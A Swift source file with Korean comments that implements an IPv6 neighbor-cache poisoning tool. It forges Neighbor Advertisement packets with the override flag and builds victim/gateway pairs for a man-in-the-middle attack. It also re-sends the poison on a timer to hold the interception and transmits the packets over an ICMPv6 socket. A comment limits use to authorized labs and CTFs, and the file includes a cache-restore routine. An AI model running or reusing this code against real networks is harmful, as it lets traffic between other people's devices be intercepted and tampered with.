import Foundation
#if canImport(Darwin)
import Darwin
#endif

// MARK: - 패킷 제작 (플랫폼 무관, 리눅스에서도 `swift test`로 시험됨)

/// IPv6 이웃 광고(NA)를 위조해 이웃 캐시에 독을 묻힌다 — ARP 스푸핑의 IPv6 사촌.
///
/// **인가받은(허락받은) 실험·CTF 환경에서만 쓴다.** 남의 트래픽을 가로채는 기법이다.
///
/// ARP에 인증이 없듯 NDP에도 없다. 이웃 광고(ICMPv6 136)는 "이 IPv6 주소는 이 MAC에 있다"고 알리는
/// 메시지인데, 요청 없이(unsolicited) Override 플래그를 켜 보내면 받는 쪽은 자기 이웃 캐시의 그 주소 항목을
/// 보낸 MAC으로 덮는다(RFC 4861 §7.2.5). 그래서 피해자에게 "게이트웨이는 내 MAC"이라 하고 게이트웨이에게
/// "피해자는 내 MAC"이라 하면 둘 사이 트래픽이 이 기기를 거친다(중간자). 공격자는 받은 패킷을 양쪽으로
/// 넘겨야(IPv6 포워딩) 통신이 끊기지 않는다.
///
/// `NeighborDiscovery`가 들어오는 NA를 **읽어** MAC을 거뒀다면, 여기서는 NA를 **만들어** 내보낸다.
/// 바이트를 짜는 일이라 플랫폼과 무관하고 리눅스에서 그대로 시험된다. 실제 전송은 `NeighborAdvertiser`가
/// 맡는데, 이 레포가 이미 쓰는 `SOCK_DGRAM` ICMPv6 소켓(raw 아님)이라 iOS 앱도 소켓은 연다 — 다만
/// 커널이 echo 말고는 못 내보내게 걸 수 있어, 나가는지는 `NeighborProber`처럼 실제로 측정한다.
public enum NDPSpoof {
    static let neighborAdvertisement: UInt8 = 136
    /// 옵션 종류 2 = 목표 링크주소(Target Link-Layer Address). 길이 1 = 8바이트 단위 한 칸.
    static let targetLinkLayerOption: UInt8 = 2

    /// NA 플래그(상위 바이트): R=라우터, S=요청에 대한 응답, O=기존 캐시를 덮어씀.
    public struct Flags: OptionSet, Sendable {
        public let rawValue: UInt8
        public init(rawValue: UInt8) { self.rawValue = rawValue }
        /// 보낸 쪽이 라우터다(게이트웨이를 사칭할 때 켠다)
        public static let router = Flags(rawValue: 0x80)
        /// 요청(NS)에 대한 답이다(요청 없이 보내는 독에서는 끈다)
        public static let solicited = Flags(rawValue: 0x40)
        /// 받는 쪽이 기존 캐시 항목을 이 MAC으로 덮게 한다(독을 묻히려면 켠다). NA의 Override(O) 비트.
        public static let overrideExisting = Flags(rawValue: 0x20)
    }

    /// 이웃 광고(ICMPv6 136) 한 통. 32바이트.
    ///
    /// 배치: type(1)·code(1)·checksum(2, DGRAM이면 커널이 채우니 0) + flags(1)+예약(3)
    /// + 목표주소(16, "이 IPv6") + TLLA 옵션[종류 2, 길이 1, MAC 6].
    public static func advertisement(target: IPv6Address, linkLayer mac: MACAddress, flags: Flags) -> [UInt8] {
        var bytes: [UInt8] = []
        bytes.reserveCapacity(32)
        bytes += [neighborAdvertisement, 0, 0, 0]          // type, code, checksum(커널이 채움)
        bytes += [flags.rawValue, 0, 0, 0]                 // flags + 예약 3바이트
        bytes += target.bytes                              // 가로챌(사칭할) IPv6
        bytes += [targetLinkLayerOption, 1]                // 옵션: 종류 2, 길이 1칸(8바이트)
        bytes += mac.bytes                                 // 그 주소가 있다고 속일 MAC
        return bytes
    }
}

// MARK: - 중간자 한 쪽(한 피해자에게 한 주소를 사칭)

/// 이웃 캐시에 독을 묻힐 한 수: `destination`에게 "`impersonatedIP`는 `spoofedMAC`에 있다"고 속인다.
///
/// 중간자는 보통 두 수가 필요하다 — 피해자에게 게이트웨이를 사칭하고, 게이트웨이에게 피해자를 사칭한다.
/// `NDPSpoof.mitm(...)`이 그 두 수를 한 번에 만든다.
public struct NDPSpoofTarget: Sendable, Equatable {
    /// NA를 받을 상대(속일 대상). 보통 그 기기의 링크로컬(fe80::…)로 유니캐스트한다.
    public let destination: IPv6Address
    /// 가로챌(사칭할) IPv6 — 받는 쪽은 이 주소의 캐시 항목을 덮는다.
    public let impersonatedIP: IPv6Address
    /// 그 주소가 있다고 속일 MAC(보통 공격자 자신).
    public let spoofedMAC: MACAddress
    /// 라우터(게이트웨이)를 사칭하면 NA의 R 플래그를 켠다.
    public let posingAsRouter: Bool

    public init(destination: IPv6Address, impersonatedIP: IPv6Address, spoofedMAC: MACAddress, posingAsRouter: Bool) {
        self.destination = destination
        self.impersonatedIP = impersonatedIP
        self.spoofedMAC = spoofedMAC
        self.posingAsRouter = posingAsRouter
    }

    /// 독을 묻히는 NA: Override를 켜 기존 캐시를 덮게 한다(요청 없이 보내므로 Solicited는 끈다).
    public var poisonPayload: [UInt8] {
        var flags: NDPSpoof.Flags = .overrideExisting
        if posingAsRouter { flags.insert(.router) }
        return NDPSpoof.advertisement(target: impersonatedIP, linkLayer: spoofedMAC, flags: flags)
    }

    /// 실험을 끝낼 때 캐시를 되돌리는 NA: 진짜 MAC을 Override로 다시 알린다.
    public func restorePayload(realMAC: MACAddress) -> [UInt8] {
        var flags: NDPSpoof.Flags = .overrideExisting
        if posingAsRouter { flags.insert(.router) }
        return NDPSpoof.advertisement(target: impersonatedIP, linkLayer: realMAC, flags: flags)
    }
}

public extension NDPSpoof {
    /// 중간자 한 판의 두 수를 만든다: 피해자에게 게이트웨이를 사칭 + 게이트웨이에게 피해자를 사칭.
    /// 둘 다 `attackerMAC`(이 기기)으로 속여, 둘 사이 트래픽이 이 기기를 거치게 한다.
    static func mitm(victim: IPv6Address, gateway: IPv6Address, attackerMAC: MACAddress) -> [NDPSpoofTarget] {
        [
            NDPSpoofTarget(destination: victim, impersonatedIP: gateway, spoofedMAC: attackerMAC, posingAsRouter: true),
            NDPSpoofTarget(destination: gateway, impersonatedIP: victim, spoofedMAC: attackerMAC, posingAsRouter: false),
        ]
    }
}

// MARK: - 내보내는 쪽(앱은 ICMPv6 소켓, 시험은 가짜)

/// 위조 NA를 실제로 내보내는 쪽. 앱/시험에서 갈아끼운다.
public protocol NeighborAdvertising: Sendable {
    /// NA 하나를 `destination`으로 보낸다. 나갔으면 true. iOS가 막거나 소켓을 못 열면 false.
    func advertise(_ payload: [UInt8], to destination: IPv6Address, on interfaceName: String?) -> Bool
}

/// NDP 스푸핑을 돌리는 조율자: 되풀이 주입과 원복을 맡는다.
///
/// 이웃 캐시는 금방 식으니(Reachable 시간이 지나면) 한 번이 아니라 `interval`마다 다시 보내 덮어 둔다.
public struct NDPSpoofer: Sendable {
    private let advertiser: any NeighborAdvertising
    public init(advertiser: any NeighborAdvertising) { self.advertiser = advertiser }

    /// `interval`마다 독 NA를 다시 보내며 `duration` 동안 중간자를 유지한다. 보낸 수·막혔는지를 돌려준다.
    @discardableResult
    public func poison(_ targets: [NDPSpoofTarget], on interface: String?,
                       every interval: Duration = .seconds(2), for duration: Duration) async -> NDPSpoofRun {
        guard !targets.isEmpty else { return NDPSpoofRun(rounds: 0, sent: 0, blocked: false) }
        let clock = ContinuousClock()
        let deadline = clock.now.advanced(by: duration)
        var rounds = 0
        var sent = 0
        var everySentFailed = true
        repeat {
            for target in targets {
                if advertiser.advertise(target.poisonPayload, to: target.destination, on: interface) {
                    sent += 1
                    everySentFailed = false
                }
            }
            rounds += 1
            let remaining = clock.now.duration(to: deadline)
            if remaining <= .zero { break }
            try? await Task.sleep(for: min(interval, remaining))
        } while clock.now < deadline
        return NDPSpoofRun(rounds: rounds, sent: sent, blocked: everySentFailed)
    }

    /// 캐시를 원래대로: 각 상대에게 진짜 MAC을 알리는 NA를 `times`번 보낸다. 보낸 수.
    @discardableResult
    public func restore(_ targets: [NDPSpoofTarget], realMACs: [IPv6Address: MACAddress],
                        on interface: String?, times: Int = 3) -> Int {
        var sent = 0
        for _ in 0..<max(1, times) {
            for target in targets {
                guard let real = realMACs[target.impersonatedIP] else { continue }
                if advertiser.advertise(target.restorePayload(realMAC: real), to: target.destination, on: interface) {
                    sent += 1
                }
            }
        }
        return sent
    }
}

/// 한 판의 결과: 몇 바퀴 돌며 NA를 몇 통 내보냈는지, 그리고 한 통도 못 나갔는지(iOS가 막음).
public struct NDPSpoofRun: Sendable, Equatable {
    public let rounds: Int
    public let sent: Int
    /// 보내려 했지만 한 통도 커널을 못 빠져나갔다(iOS가 echo 말고는 막는 경우).
    public let blocked: Bool

    public init(rounds: Int, sent: Int, blocked: Bool) {
        self.rounds = rounds
        self.sent = sent
        self.blocked = blocked
    }
}

/// 진짜로 NA를 내보내는 쪽. `NeighborProber`와 같은 `SOCK_DGRAM` ICMPv6 소켓을 쓴다(raw 아님).
///
/// NDP는 보내는 NA의 홉 한계(hop limit)가 255여야 받는 쪽이 받아 준다(RFC 4861 §11.2) — 그래서 255로 올린다.
/// 체크섬은 ICMPv6 DGRAM이라 커널이 채운다.
///
/// 단, 스톡(비루트) iOS·macOS 커널은 이 DGRAM 소켓의 송신을 echo request(128)와 NI 쿼리(139)로만 허용하고
/// NA(136)·NS(135)는 EPERM으로 막는다(XNU `icmp6_dgram_send`). 그래서 `NeighborProber`의 echo 송신은 되지만
/// 여기 NA 송신은 스톡 iOS에선 항상 실패(false)다 — 랩의 루트 맥이나 리눅스(CAP_NET_RAW)에서만 나간다.
public struct SystemNeighborAdvertiser: NeighborAdvertising {
    public init() {}

    #if canImport(Darwin)
    public func advertise(_ payload: [UInt8], to destination: IPv6Address, on interfaceName: String?) -> Bool {
        let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
        guard fd >= 0 else { return false }
        defer { close(fd) }

        let index = interfaceName.flatMap(Interfaces.index(of:))
        if var scopedIndex = index {
            // IPV6_BOUND_IF(125): 이 인터페이스로만 내보낸다
            _ = setsockopt(fd, IPPROTO_IPV6, 125, &scopedIndex, socklen_t(MemoryLayout<UInt32>.size))
        }
        // 홉 한계 255(유니캐스트·멀티캐스트 둘 다) — 아니면 받는 쪽이 NA를 버린다
        var hops: Int32 = 255
        _ = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &hops, socklen_t(MemoryLayout<Int32>.size))
        _ = setsockopt(fd, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, socklen_t(MemoryLayout<Int32>.size))

        var address = sockaddr_in6()
        address.sin6_len = UInt8(MemoryLayout<sockaddr_in6>.size)
        address.sin6_family = sa_family_t(AF_INET6)
        address.sin6_scope_id = destination.isLinkLocal ? (index ?? 0) : 0   // 링크로컬은 인터페이스 번호가 있어야 한다
        withUnsafeMutableBytes(of: &address.sin6_addr) { raw in
            for (offset, byte) in destination.bytes.prefix(16).enumerated() { raw[offset] = byte }
        }
        let count = withUnsafePointer(to: &address) { pointer in
            pointer.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                sendto(fd, payload, payload.count, 0, $0, socklen_t(MemoryLayout<sockaddr_in6>.size))
            }
        }
        return count == payload.count
    }
    #else
    public func advertise(_ payload: [UInt8], to destination: IPv6Address, on interfaceName: String?) -> Bool {
        false   // 이 플랫폼에선 ICMPv6 송신을 지원하지 않는다(시험은 가짜 Advertiser로 돈다)
    }
    #endif
}
